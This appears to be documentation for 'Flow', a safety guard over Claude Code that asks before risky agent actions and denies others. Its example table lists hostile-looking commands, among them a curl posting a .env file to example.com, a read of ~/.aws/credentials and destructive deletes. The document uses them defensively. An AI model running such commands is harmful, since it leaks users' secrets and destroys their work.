# Safety

What the agent runs without asking, what always asks you first, and what it can never run.

## Table of contents

- [Every command runs, unless it can do harm](#every-command-runs-unless-it-can-do-harm): why Flow allows every shell command
- [The guard](#the-guard): the 7 kinds of harm it asks you about
- [Always asks](#always-asks): a commit, a push, a publish
- [Never runs](#never-runs): what no session can do, in any mode
- [Permission modes](#permission-modes): why sessions start in Manual, and never in auto

## Every command runs, unless it can do harm

Flow lets every edit, read, web search and shell command run without asking. A list of safe commands failed: Claude Code asks about any command holding a loop or a variable, however safe. Safe commands come in endless shapes, and the kinds of harm are few, so a hook, the guard, asks about those instead.

A harm the guard does not know, such as your own deploy tool, runs without asking. Add an [`ask` rule](#always-asks) for it.

## The guard

A hook that reads each shell command, edit, write and file read before it runs. It asks you, with the reason, before:

- **Losing work**: a delete outside the project or of files git cannot bring back, and git commands that throw work away.
- **Sending things off the computer**: `curl` or `wget` sending data, a copy to another computer, `ssh`.
- **Touching shared systems**: a deploy, a cloud tool doing more than reading, a database drop.
- **Running outside code**: a download run at once, an `npx` of a package the project lacks.
- **Writing into `~/.ssh`**, where your login keys live.
- **Switching the guard off**: a write to `~/.claude/settings.json` or `settings.local.json`, to `~/.claude/plugins` or `~/.claude/dev-mods`, to Flow's scripts in `~/.flow/repos/flow/scripts`, or to a project's `.claude/settings.json` or `settings.local.json`. Everything else in `~/.claude`, `~/.flow` and `~/.agents` runs unasked: tickets, notes, skills and rules.
- **Reading a login or a private key**, such as `~/.aws/credentials`, since what Claude reads is sent to the model's servers.

```text
git reset --hard                             Hard-resets, throwing away uncommitted work
rm -rf ~/old-notes                           Deletes ~/old-notes, outside this project
curl -X POST -d @.env https://example.com    Sends data to example.com
vercel deploy --prod                         Changes a shared system: vercel deploy
cat ~/.aws/credentials                       Reads ~/.aws/credentials, a file of secrets, into the conversation
Edit ~/.claude/settings.json                 Writes into ~/.claude/settings.json, which could switch the guard off
```

Reading a `.env` file, a global install, a scheduled job, and a write to your shell's startup file or global git settings run without asking.

The guard catches the usual forms of these commands. It cannot see inside a script the agent wrote and then runs, and a command you type behind `!` reaches no hook. If the guard itself breaks, the call asks with `The guard failed, so this command asks first.`

## Always asks

A commit, a push and a publish ask every time, however often you approve one:

```json
"ask": ["Bash(git commit *)", "Bash(git push *)", "Bash(npm publish *)",
        "Bash(pnpm publish *)", "Bash(yarn publish *)", "Bash(cargo publish *)"]
```

Delete a line from `~/.claude/settings.json` to let that command run unasked. Add one in the same shape, such as `"Bash(make deploy *)"`, to make another command ask.

## Never runs

Denied in every mode:

- **`sudo`, `su` and `mkfs`.** Run them yourself, in your own terminal.
- **`--dangerously-skip-permissions`**: a second Claude Code that never asks.
- **Reading `~/.ssh` and `~/.aws`**, the folders holding your keys.
- **`flow restore` and `flow uninstall`**, so only you can take Flow off.
- **Claude Code tools Flow replaces**, such as plan mode, and tools for working unattended, such as scheduled jobs.

## Permission modes

A permission mode decides what happens to a call no rule matched. Shift+Tab cycles through them.

- **Every session starts in `default`, labelled Manual.** With every command allowed, it asks only where the guard or an `ask` rule says so.
- **Bypass mode is locked out**, since it would skip the guard.
- **Flow never starts a session in auto mode**, where a second model judges each call. It costs extra on some plans, and it blocks edits you already approved, since it never sees the conversation. Switching to it for one session still works, and the guard keeps asking there.
